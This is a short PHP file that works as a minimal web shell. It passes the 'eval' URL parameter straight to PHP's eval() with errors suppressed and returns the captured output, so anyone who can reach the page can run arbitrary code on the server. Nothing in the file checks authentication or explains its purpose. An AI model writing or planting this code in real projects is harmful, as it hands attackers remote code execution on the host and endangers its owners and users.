<?php
function xeval($code){
	@ob_start();
	@eval($code);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
}

$result = htmlspecialchars(xeval($_GET['eval']));
?>